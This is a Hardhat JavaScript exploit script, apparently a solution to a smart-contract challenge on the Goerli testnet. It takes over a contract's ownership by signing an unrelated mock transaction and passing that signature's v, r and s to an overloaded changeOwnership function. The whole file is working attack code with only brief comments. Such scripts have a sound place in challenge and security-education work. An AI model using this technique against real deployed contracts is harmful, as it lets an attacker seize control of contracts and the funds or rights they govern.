const { ethers } = require("hardhat");

async function main() {
    const [owner, attacker] = await ethers.getSigners();
    console.log("## Owner: ", owner.address);
    console.log("## Attacker: ", attacker.address);
    
    //This is needed because ethers needs a wallet to sign a transaction. Signers do not have the ability to do that.
    const attackerWallet = new ethers.Wallet(process.env.GOERLI_SECOND_ACCOUNT_PK);
    
    //Get the contract
    const contractABI = [
        {"inputs":[],"stateMutability":"nonpayable","type":"constructor"},
        {"inputs":[{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"changeOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},
        {"inputs":[{"internalType":"address","name":"_owner","type":"address"}],"name":"changeOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},
        {"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}
    ];

    const contractAddress = "0xa5343165d51Ea577d63e1a550b1F3c872ADc58e4";
    const switchContract = new ethers.Contract(contractAddress, contractABI, attacker);
    
    //Get the current owner
    const currentOwner = await switchContract.owner();
    console.log(`## Current contract owner: ${currentOwner}`);

    //Sign a mock transaction to another one of your addresses
    const signedTx = await attackerWallet.signTransaction({to: owner.address, value: ethers.utils.parseEther("0.1")});
    const parsedTx = ethers.utils.parseTransaction(signedTx);
    const signature = {
        r: parsedTx.r,
        s: parsedTx.s,
        v: parsedTx.v
    }

    //Ethers requires overloaded functions to be called like this
    const claimOwnershipTx = await switchContract["changeOwnership(uint8,bytes32,bytes32)"](signature.v, signature.r, signature.s);
    await claimOwnershipTx.wait();

    //You should now be the new owner
    const newOwner = await switchContract.owner();
    console.log(`## New owner: ${newOwner}`);

}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error);
        process.exit(1);
    });